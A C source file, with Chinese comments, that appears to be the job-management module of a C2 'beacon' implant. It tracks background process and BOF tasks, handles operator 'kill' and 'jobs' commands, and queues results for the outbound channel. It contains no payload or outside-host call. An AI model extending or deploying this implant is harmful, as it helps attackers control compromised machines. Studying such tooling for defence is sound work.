#include "beacon_context.h"
#include "beacon_jobs.h"
#include "beacon_packet.h"

#define JOB_WAIT_BATCH_COUNT 64
#define JOB_FREE_WAIT_TIMEOUT_MS 5000

/*
 * Job 管理器统一跟踪后台 process/BOF 任务。
 * 取消语义是协作式：设置 cancel_event/cancel_requested，具体线程自行退出。
 */

/* 在链表中查找指定 ID 的 Job（需持锁） */
static BeaconJob* JobFindLocked(JobManager* jm, UINT32 job_id)
{
    BeaconJob* cur;

    for (cur = jm->jobs; cur; cur = cur->next) {
        if (cur->task_id == job_id) {
            return cur;
        }
    }
    return NULL;
}

/* 从链表中移除 Job（需持锁） */
static VOID JobUnlinkLocked(JobManager* jm, BeaconJob* job)
{
    BeaconJob** pp;

    if (!jm || !job) return;

    pp = &jm->jobs;
    while (*pp) {
        if (*pp == job) {
            *pp = job->next;
            job->next = NULL;
            return;
        }
        pp = &(*pp)->next;
    }
}

/* 释放 Job 对象及其资源 */
static VOID JobFreeObject(BeaconJob* job)
{
    if (!job) return;

    if (job->cancel_event) {
        CloseHandle(job->cancel_event);
        job->cancel_event = NULL;
    }
    if (job->thread_handle) {
        CloseHandle(job->thread_handle);
        job->thread_handle = NULL;
    }
    if (job->process_handle) {
        CloseHandle(job->process_handle);
        job->process_handle = NULL;
    }

    SecureZeroMemory(job, sizeof(*job));
    HeapFree(GetProcessHeap(), 0, job);
}

/* 初始化 Job 管理器 */
VOID JobInit(JobManager* jm)
{
    InitializeCriticalSection(&jm->lock);
    jm->jobs = NULL;
    jm->shutting_down = 0;
}

/* 释放 Job 管理器及所有 Job */
VOID JobFree(JobManager* jm)
{
    BeaconJob* cur;
    BeaconJob* list;
    HANDLE wait_handles[JOB_WAIT_BATCH_COUNT];
    SIZE_T wait_count = 0;
    SIZE_T i;

    if (!jm) return;

    InterlockedExchange(&jm->shutting_down, 1);

    EnterCriticalSection(&jm->lock);
    for (cur = jm->jobs; cur; cur = cur->next) {
        InterlockedExchange(&cur->cancel_requested, 1);
        cur->state = JOB_STATE_STOPPING;
        if (cur->cancel_event) SetEvent(cur->cancel_event);
        if (cur->process_handle) TerminateProcess(cur->process_handle, 1);
    }
    LeaveCriticalSection(&jm->lock);

    for (;;) {
        wait_count = 0;

        EnterCriticalSection(&jm->lock);
        for (cur = jm->jobs;
             cur && wait_count < JOB_WAIT_BATCH_COUNT;
             cur = cur->next) {
            HANDLE dup = NULL;
            if (cur->thread_handle &&
                DuplicateHandle(GetCurrentProcess(), cur->thread_handle,
                                GetCurrentProcess(), &dup, SYNCHRONIZE,
                                FALSE, 0)) {
                wait_handles[wait_count++] = dup;
            }
        }
        LeaveCriticalSection(&jm->lock);

        if (wait_count == 0) {
            break;
        }

        WaitForMultipleObjects((DWORD)wait_count, wait_handles, TRUE, JOB_FREE_WAIT_TIMEOUT_MS);
        for (i = 0; i < wait_count; ++i) {
            CloseHandle(wait_handles[i]);
            wait_handles[i] = NULL;
        }

        break;
    }

    EnterCriticalSection(&jm->lock);
    list = jm->jobs;
    jm->jobs = NULL;
    LeaveCriticalSection(&jm->lock);

    while (list) {
        BeaconJob* next = list->next;
        list->next = NULL;
        JobFreeObject(list);
        list = next;
    }

    DeleteCriticalSection(&jm->lock);
}

/* 创建并注册一个后台 Job，task_id 同时作为 job id 使用 */
BeaconJob* JobCreate(struct BeaconContext* ctx, UINT32 task_id, UINT32 command_id,
                     JobType type, const CHAR* name)
{
    BeaconJob* job;

    if (!ctx || task_id == 0) return NULL;
    if (InterlockedCompareExchange(&ctx->jobs.shutting_down, 0, 0) != 0) return NULL;

    job = (BeaconJob*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*job));
    if (!job) return NULL;

    job->task_id = task_id;
    job->command_id = command_id;
    job->type = type;
    job->state = JOB_STATE_RUNNING;
    job->started_at = GetUnixTimestamp();
    job->owner = &ctx->jobs;
    if (name) {
        strcpy_s(job->name, sizeof(job->name), name);
    }

    job->cancel_event = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!job->cancel_event) {
        JobFreeObject(job);
        return NULL;
    }

    EnterCriticalSection(&ctx->jobs.lock);
    if (InterlockedCompareExchange(&ctx->jobs.shutting_down, 0, 0) != 0) {
        LeaveCriticalSection(&ctx->jobs.lock);
        JobFreeObject(job);
        return NULL;
    }
    if (JobFindLocked(&ctx->jobs, task_id)) {
        LeaveCriticalSection(&ctx->jobs.lock);
        JobFreeObject(job);
        return NULL;
    }
    job->next = ctx->jobs.jobs;
    ctx->jobs.jobs = job;
    LeaveCriticalSection(&ctx->jobs.lock);

    return job;
}

/* 以挂起态创建线程，写入 Job 句柄后再恢复，避免管理器看不到新线程 */
BOOL JobStartThread(BeaconJob* job, LPTHREAD_START_ROUTINE start, PVOID arg)
{
    HANDLE hThread;
    DWORD tid = 0;
    BOOL resumed;

    if (!job || !job->owner || !start) return FALSE;

    hThread = CreateThread(NULL, 0, start, arg, CREATE_SUSPENDED, &tid);
    if (!hThread) {
        return FALSE;
    }

    EnterCriticalSection(&job->owner->lock);
    job->thread_handle = hThread;
    resumed = ResumeThread(hThread) != (DWORD)-1;
    if (!resumed) {
        if (job->thread_handle == hThread) {
            job->thread_handle = NULL;
        }
    }
    LeaveCriticalSection(&job->owner->lock);

    if (!resumed) {
        CloseHandle(hThread);
        return FALSE;
    }

    return TRUE;
}

/* 标记 Job 完成并释放 */
VOID JobComplete(BeaconJob* job)
{
    JobManager* jm;

    if (!job || !job->owner) return;

    jm = job->owner;

    EnterCriticalSection(&jm->lock);
    JobUnlinkLocked(jm, job);
    job->owner = NULL;
    LeaveCriticalSection(&jm->lock);

    JobFreeObject(job);
}

/* 查询 Job 是否已收到取消请求 */
BOOL JobIsCancelRequested(const BeaconJob* job)
{
    if (!job) return TRUE;
    return InterlockedCompareExchange((volatile LONG*)&job->cancel_requested, 0, 0) != 0;
}

/* 获取 Job 类型名称 */
static const CHAR* JobTypeName(JobType type)
{
    switch (type) {
    case JOB_TYPE_PROCESS:  return "process";
    case JOB_TYPE_BOF:      return "bof";
    default:                return "unknown";
    }
}

/* 获取 Job 状态名称 */
static const CHAR* JobStateName(JobState state)
{
    switch (state) {
    case JOB_STATE_RUNNING:  return "running";
    case JOB_STATE_STOPPING: return "stopping";
    default:                 return "unknown";
    }
}

/* 将活跃 Job 追加到输出列表 */
static VOID JobAppendActive(JobManager* jm, ByteBuf* out, SIZE_T* count, ULONGLONG now)
{
    BeaconJob* cur;

    if (!jm || !out || !count) return;

    EnterCriticalSection(&jm->lock);
    for (cur = jm->jobs; cur; cur = cur->next) {
        ULONGLONG age = now >= cur->started_at ? now - cur->started_at : 0;
        BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
                 (unsigned long)cur->task_id,
                 JobTypeName(cur->type),
                 JobStateName(cur->state),
                 (unsigned __int64)age,
                 (unsigned long)cur->command_id,
                 cur->name[0] ? cur->name : "-",
                 cur->ref[0] ? cur->ref : "-",
                 cur->detail[0] ? cur->detail : "-");
        ++(*count);
    }
    LeaveCriticalSection(&jm->lock);
}

/* 设置 Job 关联的进程句柄 */
VOID JobSetProcessHandle(BeaconJob* job, HANDLE process_handle)
{
    if (!job || !job->owner) return;

    EnterCriticalSection(&job->owner->lock);
    job->process_handle = process_handle;
    LeaveCriticalSection(&job->owner->lock);
}

/* 将 Job 结果打包并入队到出站队列 */
VOID JobEnqueueResult(struct BeaconContext* ctx, UINT32 task_id, UINT32 command_id,
                      const ByteBuf* payload)
{
    ByteBuf final;

    if (!ctx || !payload) return;

    final = PacketMakeFinal(task_id, command_id, payload);
    OutboxEnqueue(&ctx->outbox, final);
}

/* 请求取消普通 Job；进程 Job 会额外终止关联进程句柄 */
static BOOL JobRequestKill(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
{
    BeaconJob* job;
    JobType type = 0;
    CHAR name[64] = { 0 };

    if (!out) return FALSE;

    if (!ctx || job_id == 0) {
        BbPrintf(out, "invalid job id");
        return TRUE;
    }

    EnterCriticalSection(&ctx->jobs.lock);
    job = JobFindLocked(&ctx->jobs, job_id);
    if (!job) {
        LeaveCriticalSection(&ctx->jobs.lock);
        return FALSE;
    }

    type = job->type;
    strcpy_s(name, sizeof(name), job->name);
    InterlockedExchange(&job->cancel_requested, 1);
    job->state = JOB_STATE_STOPPING;
    if (job->cancel_event) SetEvent(job->cancel_event);

    if (job->process_handle) {
        TerminateProcess(job->process_handle, 1);
    }
    LeaveCriticalSection(&ctx->jobs.lock);

    if (type == JOB_TYPE_BOF) {
        BbPrintf(out, "job %lu (%s) stop requested",
                 (unsigned long)job_id, name[0] ? name : "bof");
    } else {
        BbPrintf(out, "job %lu (%s) kill requested",
                 (unsigned long)job_id, name[0] ? name : "unknown");
    }
    return TRUE;
}

/* 列出所有活跃 Job */
static ByteBuf JobListAll(BeaconContext* ctx)
{
    ByteBuf out;
    ULONGLONG now;
    SIZE_T count = 0;

    BbInit(&out);
    if (!ctx) {
        BbPrintf(&out, "No active jobs");
        return out;
    }

    now = GetUnixTimestamp();
    BbPrintf(&out, "ID          Type        State       Age(s)     Command    Name        Ref                 Detail\n");
    BbPrintf(&out, "----------  ----------  ----------  ---------  ---------  ----------  ------------------  ----------------\n");

    JobAppendActive(&ctx->jobs, &out, &count, now);
    TransferAppendJobs(&ctx->transfers, &out, &count, now);
    TunnelAppendJobs(&ctx->tunnels, &out, &count, now);

    if (count == 0) {
        BbFree(&out);
        BbPrintf(&out, "No active jobs");
    }
    return out;
}

/* 处理 kill 命令：终止指定 Job 或列出所有 Job */
ByteBuf CommandKillJob(struct BeaconContext* ctx, Parser* parser)
{
    UINT32 argc;
    UINT32 job_id;
    ByteBuf out;

    if (!ctx) {
        return BbFromText("invalid context");
    }
    if (!parser || ParserLeft(parser) == 0) {
        return JobListAll(ctx);
    }

    argc = ParserU32(parser);
    if (parser->error[0]) {
        return BbFromText(parser->error);
    }
    if (argc < 1) {
        return JobListAll(ctx);
    }

    job_id = ParserU32(parser);
    if (parser->error[0]) {
        return BbFromText(parser->error);
    }
    if (job_id == 0) {
        return JobListAll(ctx);
    }

    BbInit(&out);
    if (JobRequestKill(ctx, job_id, &out)) {
        return out;
    }
    if (TransferCancelJob(ctx, job_id, &out)) {
        return out;
    }
    if (TunnelCancelJob(ctx, job_id, &out)) {
        return out;
    }

    BbPrintf(&out, "job %lu not found", (unsigned long)job_id);
    return out;
}

/* 处理 jobs 命令：列出所有活跃 Job */
ByteBuf CommandJobs(struct BeaconContext* ctx)
{
    if (!ctx) {
        return BbFromText("invalid context");
    }
    return JobListAll(ctx);
}
